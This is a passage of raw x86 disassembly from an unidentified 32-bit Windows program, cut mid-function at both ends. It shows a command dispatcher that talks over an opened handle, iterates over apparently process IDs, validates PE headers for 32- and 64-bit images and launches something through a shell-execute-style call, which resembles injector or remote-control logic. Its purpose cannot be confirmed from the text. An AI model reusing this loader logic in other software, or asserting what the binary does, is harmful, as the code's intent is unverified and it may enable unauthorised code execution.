  4017c0:	8d 85 0c f6 ff ff    	lea    -0x9f4(%ebp),%eax
  4017c6:	50                   	push   %eax
  4017c7:	57                   	push   %edi
  4017c8:	ff d6                	call   *%esi
  4017ca:	6a 00                	push   $0x0
  4017cc:	8d 85 14 f6 ff ff    	lea    -0x9ec(%ebp),%eax
  4017d2:	50                   	push   %eax
  4017d3:	6a 04                	push   $0x4
  4017d5:	8d 85 04 f6 ff ff    	lea    -0x9fc(%ebp),%eax
  4017db:	50                   	push   %eax
  4017dc:	57                   	push   %edi
  4017dd:	ff d6                	call   *%esi
  4017df:	57                   	push   %edi
  4017e0:	ff 15 18 f1 40 00    	call   *0x40f118
  4017e6:	5f                   	pop    %edi
  4017e7:	5e                   	pop    %esi
  4017e8:	5b                   	pop    %ebx
  4017e9:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4017ec:	33 cd                	xor    %ebp,%ecx
  4017ee:	e8 52 1f 00 00       	call   0x403745
  4017f3:	8b e5                	mov    %ebp,%esp
  4017f5:	5d                   	pop    %ebp
  4017f6:	c3                   	ret
  4017f7:	6a 01                	push   $0x1
  4017f9:	51                   	push   %ecx
  4017fa:	8b 8d 04 f6 ff ff    	mov    -0x9fc(%ebp),%ecx
  401800:	e8 9b 09 00 00       	call   0x4021a0
  401805:	83 c4 08             	add    $0x8,%esp
  401808:	5f                   	pop    %edi
  401809:	5e                   	pop    %esi
  40180a:	5b                   	pop    %ebx
  40180b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40180e:	33 cd                	xor    %ebp,%ecx
  401810:	e8 30 1f 00 00       	call   0x403745
  401815:	8b e5                	mov    %ebp,%esp
  401817:	5d                   	pop    %ebp
  401818:	c3                   	ret
  401819:	81 fb 01 30 00 00    	cmp    $0x3001,%ebx
  40181f:	0f 87 b9 03 00 00    	ja     0x401bde
  401825:	0f 84 51 03 00 00    	je     0x401b7c
  40182b:	8b c3                	mov    %ebx,%eax
  40182d:	2d 02 20 00 00       	sub    $0x2002,%eax
  401832:	0f 84 67 02 00 00    	je     0x401a9f
  401838:	83 e8 01             	sub    $0x1,%eax
  40183b:	0f 84 87 00 00 00    	je     0x4018c8
  401841:	83 e8 01             	sub    $0x1,%eax
  401844:	0f 85 15 05 00 00    	jne    0x401d5f
  40184a:	8d 85 14 f6 ff ff    	lea    -0x9ec(%ebp),%eax
  401850:	89 9d 10 f6 ff ff    	mov    %ebx,-0x9f0(%ebp)
  401856:	50                   	push   %eax
  401857:	ff 15 f4 f0 40 00    	call   *0x40f0f4
  40185d:	50                   	push   %eax
  40185e:	ff 15 d0 f0 40 00    	call   *0x40f0d0
  401864:	85 c0                	test   %eax,%eax
  401866:	74 4a                	je     0x4018b2
  401868:	83 bd 14 f6 ff ff 00 	cmpl   $0x0,-0x9ec(%ebp)
  40186f:	74 41                	je     0x4018b2
  401871:	6a 00                	push   $0x0
  401873:	6a 00                	push   $0x0
  401875:	6a 03                	push   $0x3
  401877:	6a 00                	push   $0x0
  401879:	6a 00                	push   $0x0
  40187b:	68 00 00 00 c0       	push   $0xc0000000
  401880:	68 28 3e 41 00       	push   $0x413e28
  401885:	ff 15 20 f1 40 00    	call   *0x40f120
  40188b:	8b f0                	mov    %eax,%esi
  40188d:	83 fe ff             	cmp    $0xffffffff,%esi
  401890:	74 20                	je     0x4018b2
  401892:	6a 00                	push   $0x0
  401894:	8d 85 14 f6 ff ff    	lea    -0x9ec(%ebp),%eax
  40189a:	50                   	push   %eax
  40189b:	6a 04                	push   $0x4
  40189d:	8d 85 10 f6 ff ff    	lea    -0x9f0(%ebp),%eax
  4018a3:	50                   	push   %eax
  4018a4:	56                   	push   %esi
  4018a5:	ff 15 24 f1 40 00    	call   *0x40f124
  4018ab:	56                   	push   %esi
  4018ac:	ff 15 18 f1 40 00    	call   *0x40f118
  4018b2:	e8 49 16 00 00       	call   0x402f00
  4018b7:	5f                   	pop    %edi
  4018b8:	5e                   	pop    %esi
  4018b9:	5b                   	pop    %ebx
  4018ba:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4018bd:	33 cd                	xor    %ebp,%ecx
  4018bf:	e8 81 1e 00 00       	call   0x403745
  4018c4:	8b e5                	mov    %ebp,%esp
  4018c6:	5d                   	pop    %ebp
  4018c7:	c3                   	ret
  4018c8:	6a 00                	push   $0x0
  4018ca:	8d 85 14 f6 ff ff    	lea    -0x9ec(%ebp),%eax
  4018d0:	50                   	push   %eax
  4018d1:	6a 04                	push   $0x4
  4018d3:	8d 85 00 f6 ff ff    	lea    -0xa00(%ebp),%eax
  4018d9:	50                   	push   %eax
  4018da:	56                   	push   %esi
  4018db:	ff 15 2c f1 40 00    	call   *0x40f12c
  4018e1:	85 c0                	test   %eax,%eax
  4018e3:	0f 84 76 04 00 00    	je     0x401d5f
  4018e9:	83 bd 14 f6 ff ff 04 	cmpl   $0x4,-0x9ec(%ebp)
  4018f0:	0f 85 69 04 00 00    	jne    0x401d5f
  4018f6:	8b bd 00 f6 ff ff    	mov    -0xa00(%ebp),%edi
  4018fc:	8d 85 10 f6 ff ff    	lea    -0x9f0(%ebp),%eax
  401902:	50                   	push   %eax
  401903:	c7 85 18 f6 ff ff 00 	movl   $0x0,-0x9e8(%ebp)
  40190a:	00 00 00 
  40190d:	ff 15 f4 f0 40 00    	call   *0x40f0f4
  401913:	8b 35 d0 f0 40 00    	mov    0x40f0d0,%esi
  401919:	50                   	push   %eax
  40191a:	ff d6                	call   *%esi
  40191c:	85 c0                	test   %eax,%eax
  40191e:	0f 84 10 01 00 00    	je     0x401a34
  401924:	83 bd 10 f6 ff ff 00 	cmpl   $0x0,-0x9f0(%ebp)
  40192b:	0f 84 03 01 00 00    	je     0x401a34
  401931:	57                   	push   %edi
  401932:	6a 00                	push   $0x0
  401934:	68 00 10 00 00       	push   $0x1000
  401939:	ff 15 68 f0 40 00    	call   *0x40f068
  40193f:	8b f8                	mov    %eax,%edi
  401941:	85 ff                	test   %edi,%edi
  401943:	0f 84 16 04 00 00    	je     0x401d5f
  401949:	8d 85 0c f6 ff ff    	lea    -0x9f4(%ebp),%eax
  40194f:	50                   	push   %eax
  401950:	57                   	push   %edi
  401951:	ff d6                	call   *%esi
  401953:	85 c0                	test   %eax,%eax
  401955:	74 1f                	je     0x401976
  401957:	33 c0                	xor    %eax,%eax
  401959:	c7 85 18 f6 ff ff 01 	movl   $0x1,-0x9e8(%ebp)
  401960:	00 00 00 
  401963:	39 85 0c f6 ff ff    	cmp    %eax,-0x9f4(%ebp)
  401969:	0f 94 c0             	sete   %al
  40196c:	89 85 1c f6 ff ff    	mov    %eax,-0x9e4(%ebp)
  401972:	8b f0                	mov    %eax,%esi
  401974:	eb 06                	jmp    0x40197c
  401976:	8b b5 14 f6 ff ff    	mov    -0x9ec(%ebp),%esi
  40197c:	57                   	push   %edi
  40197d:	ff 15 18 f1 40 00    	call   *0x40f118
  401983:	83 bd 18 f6 ff ff 00 	cmpl   $0x0,-0x9e8(%ebp)
  40198a:	0f 84 cf 03 00 00    	je     0x401d5f
  401990:	85 f6                	test   %esi,%esi
  401992:	0f 84 9c 00 00 00    	je     0x401a34
  401998:	8d 85 10 f6 ff ff    	lea    -0x9f0(%ebp),%eax
  40199e:	89 9d 0c f6 ff ff    	mov    %ebx,-0x9f4(%ebp)
  4019a4:	50                   	push   %eax
  4019a5:	ff 15 f4 f0 40 00    	call   *0x40f0f4
  4019ab:	50                   	push   %eax
  4019ac:	ff 15 d0 f0 40 00    	call   *0x40f0d0
  4019b2:	85 c0                	test   %eax,%eax
  4019b4:	0f 84 a5 03 00 00    	je     0x401d5f
  4019ba:	83 bd 10 f6 ff ff 00 	cmpl   $0x0,-0x9f0(%ebp)
  4019c1:	0f 84 98 03 00 00    	je     0x401d5f
  4019c7:	6a 00                	push   $0x0
  4019c9:	6a 00                	push   $0x0
  4019cb:	6a 03                	push   $0x3
  4019cd:	6a 00                	push   $0x0
  4019cf:	6a 00                	push   $0x0
  4019d1:	68 00 00 00 c0       	push   $0xc0000000
  4019d6:	68 28 3e 41 00       	push   $0x413e28
  4019db:	ff 15 20 f1 40 00    	call   *0x40f120
  4019e1:	8b f8                	mov    %eax,%edi
  4019e3:	83 ff ff             	cmp    $0xffffffff,%edi
  4019e6:	0f 84 73 03 00 00    	je     0x401d5f
  4019ec:	8b 35 24 f1 40 00    	mov    0x40f124,%esi
  4019f2:	8d 85 10 f6 ff ff    	lea    -0x9f0(%ebp),%eax
  4019f8:	6a 00                	push   $0x0
  4019fa:	50                   	push   %eax
  4019fb:	6a 04                	push   $0x4
  4019fd:	8d 85 0c f6 ff ff    	lea    -0x9f4(%ebp),%eax
  401a03:	50                   	push   %eax
  401a04:	57                   	push   %edi
  401a05:	ff d6                	call   *%esi
  401a07:	6a 00                	push   $0x0
  401a09:	8d 85 10 f6 ff ff    	lea    -0x9f0(%ebp),%eax
  401a0f:	50                   	push   %eax
  401a10:	6a 04                	push   $0x4
  401a12:	8d 85 00 f6 ff ff    	lea    -0xa00(%ebp),%eax
  401a18:	50                   	push   %eax
  401a19:	57                   	push   %edi
  401a1a:	ff d6                	call   *%esi
  401a1c:	57                   	push   %edi
  401a1d:	ff 15 18 f1 40 00    	call   *0x40f118
  401a23:	5f                   	pop    %edi
  401a24:	5e                   	pop    %esi
  401a25:	5b                   	pop    %ebx
  401a26:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401a29:	33 cd                	xor    %ebp,%ecx
  401a2b:	e8 15 1d 00 00       	call   0x403745
  401a30:	8b e5                	mov    %ebp,%esp
  401a32:	5d                   	pop    %ebp
  401a33:	c3                   	ret
  401a34:	8b bd 00 f6 ff ff    	mov    -0xa00(%ebp),%edi
  401a3a:	68 80 3e 00 00       	push   $0x3e80
  401a3f:	e8 14 1d 00 00       	call   0x403758
  401a44:	83 c4 04             	add    $0x4,%esp
  401a47:	c7 85 18 f6 ff ff e8 	movl   $0x3e8,-0x9e8(%ebp)
  401a4e:	03 00 00 
  401a51:	8b f0                	mov    %eax,%esi
  401a53:	8d 95 18 f6 ff ff    	lea    -0x9e8(%ebp),%edx
  401a59:	8b ce                	mov    %esi,%ecx
  401a5b:	e8 a0 11 00 00       	call   0x402c00
  401a60:	85 c0                	test   %eax,%eax
  401a62:	74 35                	je     0x401a99
  401a64:	8b 95 18 f6 ff ff    	mov    -0x9e8(%ebp),%edx
  401a6a:	33 c9                	xor    %ecx,%ecx
  401a6c:	85 d2                	test   %edx,%edx
  401a6e:	74 29                	je     0x401a99
  401a70:	8b c6                	mov    %esi,%eax
  401a72:	bb 77 72 00 00       	mov    $0x7277,%ebx
  401a77:	66 39 58 04          	cmp    %bx,0x4(%eax)
  401a7b:	75 04                	jne    0x401a81
  401a7d:	39 38                	cmp    %edi,(%eax)
  401a7f:	74 0e                	je     0x401a8f
  401a81:	41                   	inc    %ecx
  401a82:	83 c0 10             	add    $0x10,%eax
  401a85:	3b ca                	cmp    %edx,%ecx
  401a87:	72 ee                	jb     0x401a77
  401a89:	56                   	push   %esi
  401a8a:	e9 c8 02 00 00       	jmp    0x401d57
  401a8f:	c1 e1 04             	shl    $0x4,%ecx
  401a92:	03 ce                	add    %esi,%ecx
  401a94:	e8 a7 13 00 00       	call   0x402e40
  401a99:	56                   	push   %esi
  401a9a:	e9 b8 02 00 00       	jmp    0x401d57
  401a9f:	8d 85 14 f6 ff ff    	lea    -0x9ec(%ebp),%eax
  401aa5:	89 9d 10 f6 ff ff    	mov    %ebx,-0x9f0(%ebp)
  401aab:	50                   	push   %eax
  401aac:	ff 15 f4 f0 40 00    	call   *0x40f0f4
  401ab2:	50                   	push   %eax
  401ab3:	ff 15 d0 f0 40 00    	call   *0x40f0d0
  401ab9:	85 c0                	test   %eax,%eax
  401abb:	74 4a                	je     0x401b07
  401abd:	83 bd 14 f6 ff ff 00 	cmpl   $0x0,-0x9ec(%ebp)
  401ac4:	74 41                	je     0x401b07
  401ac6:	6a 00                	push   $0x0
  401ac8:	6a 00                	push   $0x0
  401aca:	6a 03                	push   $0x3
  401acc:	6a 00                	push   $0x0
  401ace:	6a 00                	push   $0x0
  401ad0:	68 00 00 00 c0       	push   $0xc0000000
  401ad5:	68 28 3e 41 00       	push   $0x413e28
  401ada:	ff 15 20 f1 40 00    	call   *0x40f120
  401ae0:	8b f0                	mov    %eax,%esi
  401ae2:	83 fe ff             	cmp    $0xffffffff,%esi
  401ae5:	74 20                	je     0x401b07
  401ae7:	6a 00                	push   $0x0
  401ae9:	8d 85 14 f6 ff ff    	lea    -0x9ec(%ebp),%eax
  401aef:	50                   	push   %eax
  401af0:	6a 04                	push   $0x4
  401af2:	8d 85 10 f6 ff ff    	lea    -0x9f0(%ebp),%eax
  401af8:	50                   	push   %eax
  401af9:	56                   	push   %esi
  401afa:	ff 15 24 f1 40 00    	call   *0x40f124
  401b00:	56                   	push   %esi
  401b01:	ff 15 18 f1 40 00    	call   *0x40f118
  401b07:	68 40 9c 00 00       	push   $0x9c40
  401b0c:	e8 47 1c 00 00       	call   0x403758
  401b11:	83 c4 04             	add    $0x4,%esp
  401b14:	c7 85 1c f6 ff ff 00 	movl   $0x0,-0x9e4(%ebp)
  401b1b:	00 00 00 
  401b1e:	8b f8                	mov    %eax,%edi
  401b20:	8d 85 1c f6 ff ff    	lea    -0x9e4(%ebp),%eax
  401b26:	50                   	push   %eax
  401b27:	68 40 9c 00 00       	push   $0x9c40
  401b2c:	57                   	push   %edi
  401b2d:	ff 15 14 f1 40 00    	call   *0x40f114
  401b33:	85 c0                	test   %eax,%eax
  401b35:	0f 84 24 02 00 00    	je     0x401d5f
  401b3b:	8b 85 1c f6 ff ff    	mov    -0x9e4(%ebp),%eax
  401b41:	33 f6                	xor    %esi,%esi
  401b43:	c1 e8 02             	shr    $0x2,%eax
  401b46:	89 85 1c f6 ff ff    	mov    %eax,-0x9e4(%ebp)
  401b4c:	85 c0                	test   %eax,%eax
  401b4e:	0f 84 0b 02 00 00    	je     0x401d5f
  401b54:	6a 01                	push   $0x1
  401b56:	51                   	push   %ecx
  401b57:	8b 0c b7             	mov    (%edi,%esi,4),%ecx
  401b5a:	e8 41 06 00 00       	call   0x4021a0
  401b5f:	46                   	inc    %esi
  401b60:	83 c4 08             	add    $0x8,%esp
  401b63:	3b b5 1c f6 ff ff    	cmp    -0x9e4(%ebp),%esi
  401b69:	72 e9                	jb     0x401b54
  401b6b:	5f                   	pop    %edi
  401b6c:	5e                   	pop    %esi
  401b6d:	5b                   	pop    %ebx
  401b6e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401b71:	33 cd                	xor    %ebp,%ecx
  401b73:	e8 cd 1b 00 00       	call   0x403745
  401b78:	8b e5                	mov    %ebp,%esp
  401b7a:	5d                   	pop    %ebp
  401b7b:	c3                   	ret
  401b7c:	51                   	push   %ecx
  401b7d:	8d 95 e4 fb ff ff    	lea    -0x41c(%ebp),%edx
  401b83:	8b ce                	mov    %esi,%ecx
  401b85:	e8 96 02 00 00       	call   0x401e20
  401b8a:	83 c4 04             	add    $0x4,%esp
  401b8d:	85 c0                	test   %eax,%eax
  401b8f:	0f 84 ca 01 00 00    	je     0x401d5f
  401b95:	51                   	push   %ecx
  401b96:	8d 95 f0 fd ff ff    	lea    -0x210(%ebp),%edx
  401b9c:	8b ce                	mov    %esi,%ecx
  401b9e:	e8 7d 02 00 00       	call   0x401e20
  401ba3:	83 c4 04             	add    $0x4,%esp
  401ba6:	85 c0                	test   %eax,%eax
  401ba8:	0f 84 b1 01 00 00    	je     0x401d5f
  401bae:	6a 05                	push   $0x5
  401bb0:	6a 00                	push   $0x0
  401bb2:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  401bb8:	50                   	push   %eax
  401bb9:	8d 85 e4 fb ff ff    	lea    -0x41c(%ebp),%eax
  401bbf:	50                   	push   %eax
  401bc0:	68 d4 3d 41 00       	push   $0x413dd4
  401bc5:	6a 00                	push   $0x0
  401bc7:	ff 15 fc f1 40 00    	call   *0x40f1fc
  401bcd:	5f                   	pop    %edi
  401bce:	5e                   	pop    %esi
  401bcf:	5b                   	pop    %ebx
  401bd0:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401bd3:	33 cd                	xor    %ebp,%ecx
  401bd5:	e8 6b 1b 00 00       	call   0x403745
  401bda:	8b e5                	mov    %ebp,%esp
  401bdc:	5d                   	pop    %ebp
  401bdd:	c3                   	ret
  401bde:	81 fb 02 30 00 00    	cmp    $0x3002,%ebx
  401be4:	74 3b                	je     0x401c21
  401be6:	81 fb 01 40 00 00    	cmp    $0x4001,%ebx
  401bec:	0f 85 6d 01 00 00    	jne    0x401d5f
  401bf2:	8d 85 0b f6 ff ff    	lea    -0x9f5(%ebp),%eax
  401bf8:	c6 85 0b f6 ff ff 00 	movb   $0x0,-0x9f5(%ebp)
  401bff:	50                   	push   %eax
  401c00:	51                   	push   %ecx
  401c01:	e8 ca 1a 00 00       	call   0x4036d0
  401c06:	51                   	push   %ecx
  401c07:	8d 95 0a f6 ff ff    	lea    -0x9f6(%ebp),%edx
  401c0d:	c6 85 0a f6 ff ff 00 	movb   $0x0,-0x9f6(%ebp)
  401c14:	e8 f7 1a 00 00       	call   0x403710
  401c19:	6a 00                	push   $0x0
  401c1b:	ff 15 10 f1 40 00    	call   *0x40f110
  401c21:	51                   	push   %ecx
  401c22:	8d 95 f0 fd ff ff    	lea    -0x210(%ebp),%edx
  401c28:	8b ce                	mov    %esi,%ecx
  401c2a:	e8 f1 01 00 00       	call   0x401e20
  401c2f:	83 c4 04             	add    $0x4,%esp
  401c32:	85 c0                	test   %eax,%eax
  401c34:	0f 84 25 01 00 00    	je     0x401d5f
  401c3a:	8b 3d 2c f1 40 00    	mov    0x40f12c,%edi
  401c40:	8d 85 18 f6 ff ff    	lea    -0x9e8(%ebp),%eax
  401c46:	6a 00                	push   $0x0
  401c48:	50                   	push   %eax
  401c49:	6a 04                	push   $0x4
  401c4b:	8d 85 1c f6 ff ff    	lea    -0x9e4(%ebp),%eax
  401c51:	50                   	push   %eax
  401c52:	56                   	push   %esi
  401c53:	ff d7                	call   *%edi
  401c55:	85 c0                	test   %eax,%eax
  401c57:	0f 84 02 01 00 00    	je     0x401d5f
  401c5d:	83 bd 18 f6 ff ff 04 	cmpl   $0x4,-0x9e8(%ebp)
  401c64:	0f 85 f5 00 00 00    	jne    0x401d5f
  401c6a:	ff b5 1c f6 ff ff    	push   -0x9e4(%ebp)
  401c70:	e8 e3 1a 00 00       	call   0x403758
  401c75:	83 c4 04             	add    $0x4,%esp
  401c78:	8b d8                	mov    %eax,%ebx
  401c7a:	8d 85 18 f6 ff ff    	lea    -0x9e8(%ebp),%eax
  401c80:	89 9d 0c f6 ff ff    	mov    %ebx,-0x9f4(%ebp)
  401c86:	6a 00                	push   $0x0
  401c88:	50                   	push   %eax
  401c89:	ff b5 1c f6 ff ff    	push   -0x9e4(%ebp)
  401c8f:	53                   	push   %ebx
  401c90:	56                   	push   %esi
  401c91:	ff d7                	call   *%edi
  401c93:	85 c0                	test   %eax,%eax
  401c95:	0f 84 bb 00 00 00    	je     0x401d56
  401c9b:	8b 85 18 f6 ff ff    	mov    -0x9e8(%ebp),%eax
  401ca1:	3b 85 1c f6 ff ff    	cmp    -0x9e4(%ebp),%eax
  401ca7:	0f 85 a9 00 00 00    	jne    0x401d56
  401cad:	8b 43 3c             	mov    0x3c(%ebx),%eax
  401cb0:	81 3c 18 50 45 00 00 	cmpl   $0x4550,(%eax,%ebx,1)
  401cb7:	0f 85 99 00 00 00    	jne    0x401d56
  401cbd:	0f b7 44 18 18       	movzwl 0x18(%eax,%ebx,1),%eax
  401cc2:	ba 0b 01 00 00       	mov    $0x10b,%edx
  401cc7:	8b c8                	mov    %eax,%ecx
  401cc9:	66 3b c2             	cmp    %dx,%ax
  401ccc:	74 7b                	je     0x401d49
  401cce:	b8 0b 02 00 00       	mov    $0x20b,%eax
  401cd3:	66 3b c8             	cmp    %ax,%cx
  401cd6:	75 7e                	jne    0x401d56
  401cd8:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  401cde:	50                   	push   %eax
  401cdf:	ff 15 28 f1 40 00    	call   *0x40f128
  401ce5:	8b bd 1c f6 ff ff    	mov    -0x9e4(%ebp),%edi
  401ceb:	83 c7 04             	add    $0x4,%edi
  401cee:	8d 34 45 02 00 00 00 	lea    0x2(,%eax,2),%esi
  401cf5:	03 fe                	add    %esi,%edi
  401cf7:	57                   	push   %edi
  401cf8:	e8 5b 1a 00 00       	call   0x403758
  401cfd:	8b d8                	mov    %eax,%ebx
  401cff:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  401d05:	56                   	push   %esi
  401d06:	50                   	push   %eax
  401d07:	53                   	push   %ebx
  401d08:	e8 63 35 00 00       	call   0x405270
  401d0d:	8b 8d 1c f6 ff ff    	mov    -0x9e4(%ebp),%ecx
  401d13:	8d 46 04             	lea    0x4(%esi),%eax
  401d16:	89 0c 33             	mov    %ecx,(%ebx,%esi,1)
  401d19:	03 c3                	add    %ebx,%eax
  401d1b:	ff b5 1c f6 ff ff    	push   -0x9e4(%ebp)
  401d21:	ff b5 0c f6 ff ff    	push   -0x9f4(%ebp)
  401d27:	50                   	push   %eax
  401d28:	e8 43 35 00 00       	call   0x405270
  401d2d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401d30:	8b d3                	mov    %ebx,%edx
  401d32:	57                   	push   %edi
  401d33:	e8 48 00 00 00       	call   0x401d80
  401d38:	53                   	push   %ebx
  401d39:	e8 15 1a 00 00       	call   0x403753
  401d3e:	8b 9d 0c f6 ff ff    	mov    -0x9f4(%ebp),%ebx
  401d44:	83 c4 24             	add    $0x24,%esp
  401d47:	eb 0d                	jmp    0x401d56
  401d49:	8b d3                	mov    %ebx,%edx
  401d4b:	8d 8d f0 fd ff ff    	lea    -0x210(%ebp),%ecx
  401d51:	e8 7a 02 00 00       	call   0x401fd0
  401d56:	53                   	push   %ebx
  401d57:	e8 f7 19 00 00       	call   0x403753
  401d5c:	83 c4 04             	add    $0x4,%esp
  401d5f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401d62:	5f                   	pop    %edi
  401d63:	5e                   	pop    %esi
  401d64:	33 cd                	xor    %ebp,%ecx
  401d66:	5b                   	pop    %ebx
  401d67:	e8 d9 19 00 00       	call   0x403745
  401d6c:	8b e5                	mov    %ebp,%esp
  401d6e:	5d                   	pop    %ebp
  401d6f:	c3                   	ret
  401d70:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  401d71:	13 40 00             	adc    0x0(%eax),%eax
  401d74:	ba 13 40 00 89       	mov    $0x89004013,%edx
  401d79:	15 40 00 0c 16       	adc    $0x160c0040,%eax
  401d7e:	40                   	inc    %eax
  401d7f:	00 55 8b             	add    %dl,-0x75(%ebp)
  401d82:	ec                   	in     (%dx),%al
  401d83:	83 ec 0c             	sub    $0xc,%esp
  401d86:	a1 04 60 41 00       	mov    0x416004,%eax
  401d8b:	33 c5                	xor    %ebp,%eax
  401d8d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401d90:	53                   	push   %ebx
  401d91:	8d 45 f8             	lea    -0x8(%ebp),%eax
  401d94:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  401d97:	50                   	push   %eax
  401d98:	8b da                	mov    %edx,%ebx
  401d9a:	ff 15 f4 f0 40 00    	call   *0x40f0f4
  401da0:	50                   	push   %eax
  401da1:	ff 15 d0 f0 40 00    	call   *0x40f0d0
  401da7:	85 c0                	test   %eax,%eax
  401da9:	74 5d                	je     0x401e08
  401dab:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  401daf:	74 57                	je     0x401e08
  401db1:	56                   	push   %esi
  401db2:	6a 00                	push   $0x0
  401db4:	6a 00                	push   $0x0
  401db6:	6a 03                	push   $0x3
  401db8:	6a 00                	push   $0x0
  401dba:	6a 00                	push   $0x0
  401dbc:	68 00 00 00 c0       	push   $0xc0000000
  401dc1:	68 28 3e 41 00       	push   $0x413e28
  401dc6:	ff 15 20 f1 40 00    	call   *0x40f120
  401dcc:	8b f0                	mov    %eax,%esi
  401dce:	83 fe ff             	cmp    $0xffffffff,%esi
  401dd1:	74 34                	je     0x401e07
  401dd3:	6a 00                	push   $0x0
  401dd5:	8d 45 f8             	lea    -0x8(%ebp),%eax
  401dd8:	50                   	push   %eax
  401dd9:	6a 04                	push   $0x4
  401ddb:	8d 45 f4             	lea    -0xc(%ebp),%eax
  401dde:	50                   	push   %eax
  401ddf:	56                   	push   %esi
  401de0:	ff 15 24 f1 40 00    	call   *0x40f124
  401de6:	85 db                	test   %ebx,%ebx
  401de8:	74 16                	je     0x401e00
  401dea:	8b 45 08             	mov    0x8(%ebp),%eax
  401ded:	85 c0                	test   %eax,%eax
  401def:	74 0f                	je     0x401e00
  401df1:	6a 00                	push   $0x0
  401df3:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  401df6:	51                   	push   %ecx
  401df7:	50                   	push   %eax
  401df8:	53                   	push   %ebx
  401df9:	56                   	push   %esi
  401dfa:	ff 15 24 f1 40 00    	call   *0x40f124
  401e00:	56                   	push   %esi
  401e01:	ff 15 18 f1 40 00    	call   *0x40f118
  401e07:	5e                   	pop    %esi
  401e08:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401e0b:	33 cd                	xor    %ebp,%ecx
  401e0d:	5b                   	pop    %ebx
  401e0e:	e8 32 19 00 00       	call   0x403745
  401e13:	8b e5                	mov    %ebp,%esp
  401e15:	5d                   	pop    %ebp
  401e16:	c3                   	ret
  401e17:	cc                   	int3
  401e18:	cc                   	int3
  401e19:	cc                   	int3
  401e1a:	cc                   	int3
  401e1b:	cc                   	int3
  401e1c:	cc                   	int3
  401e1d:	cc                   	int3
  401e1e:	cc                   	int3
  401e1f:	cc                   	int3
  401e20:	55                   	push   %ebp
  401e21:	8b ec                	mov    %esp,%ebp
  401e23:	83 ec 08             	sub    $0x8,%esp
  401e26:	a1 04 60 41 00       	mov    0x416004,%eax
  401e2b:	33 c5                	xor    %ebp,%eax
  401e2d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401e30:	53                   	push   %ebx
  401e31:	56                   	push   %esi
  401e32:	57                   	push   %edi
  401e33:	8b f2                	mov    %edx,%esi
  401e35:	8b d9                	mov    %ecx,%ebx
  401e37:	33 ff                	xor    %edi,%edi
  401e39:	0f 1f 80 00 00 00 00 	nopl   0x0(%eax)
  401e40:	6a 00                	push   $0x0
  401e42:	8d 45 f8             	lea    -0x8(%ebp),%eax
  401e45:	50                   	push   %eax
  401e46:	6a 02                	push   $0x2
  401e48:	56                   	push   %esi
  401e49:	53                   	push   %ebx
  401e4a:	ff 15 2c f1 40 00    	call   *0x40f12c
  401e50:	85 c0                	test   %eax,%eax
  401e52:	74 18                	je     0x401e6c
  401e54:	83 7d f8 02          	cmpl   $0x2,-0x8(%ebp)
  401e58:	75 12                	jne    0x401e6c
  401e5a:	66 83 3e 00          	cmpw   $0x0,(%esi)
  401e5e:	74 1f                	je     0x401e7f
  401e60:	47                   	inc    %edi
  401e61:	83 c6 02             	add    $0x2,%esi
  401e64:	81 ff 05 01 00 00    	cmp    $0x105,%edi
  401e6a:	72 d4                	jb     0x401e40
  401e6c:	5f                   	pop    %edi
  401e6d:	5e                   	pop    %esi
  401e6e:	33 c0                	xor    %eax,%eax
  401e70:	5b                   	pop    %ebx
  401e71:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401e74:	33 cd                	xor    %ebp,%ecx
  401e76:	e8 ca 18 00 00       	call   0x403745
  401e7b:	8b e5                	mov    %ebp,%esp
  401e7d:	5d                   	pop    %ebp
  401e7e:	c3                   	ret
  401e7f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401e82:	b8 01 00 00 00       	mov    $0x1,%eax
  401e87:	5f                   	pop    %edi
  401e88:	5e                   	pop    %esi
  401e89:	33 cd                	xor    %ebp,%ecx
  401e8b:	5b                   	pop    %ebx
  401e8c:	e8 b4 18 00 00       	call   0x403745
  401e91:	8b e5                	mov    %ebp,%esp
  401e93:	5d                   	pop    %ebp
  401e94:	c3                   	ret
  401e95:	cc                   	int3
  401e96:	cc                   	int3
  401e97:	cc                   	int3
  401e98:	cc                   	int3
  401e99:	cc                   	int3
  401e9a:	cc                   	int3
  401e9b:	cc                   	int3
  401e9c:	cc                   	int3
  401e9d:	cc                   	int3
  401e9e:	cc                   	int3
  401e9f:	cc                   	int3
  401ea0:	55                   	push   %ebp
  401ea1:	8b ec                	mov    %esp,%ebp
  401ea3:	83 e4 f8             	and    $0xfffffff8,%esp
  401ea6:	83 ec 40             	sub    $0x40,%esp
  401ea9:	a1 04 60 41 00       	mov    0x416004,%eax
  401eae:	33 c4                	xor    %esp,%eax
  401eb0:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  401eb4:	56                   	push   %esi
  401eb5:	57                   	push   %edi
  401eb6:	8d 44 24 08          	lea    0x8(%esp),%eax
  401eba:	c7 44 24 3c 00 00 00 	movl   $0x0,0x3c(%esp)
  401ec1:	00 
  401ec2:	50                   	push   %eax
  401ec3:	6a 00                	push   $0x0
  401ec5:	6a 00                	push   $0x0
  401ec7:	6a 00                	push   $0x0
  401ec9:	6a 00                	push   $0x0
  401ecb:	6a 00                	push   $0x0
  401ecd:	6a 00                	push   $0x0
  401ecf:	6a 00                	push   $0x0
  401ed1:	6a 00                	push   $0x0
  401ed3:	6a 01                	push   $0x1
  401ed5:	8d 44 24 64          	lea    0x64(%esp),%eax
  401ed9:	66 c7 44 24 68 00 01 	movw   $0x100,0x68(%esp)
  401ee0:	50                   	push   %eax
  401ee1:	8b f9                	mov    %ecx,%edi
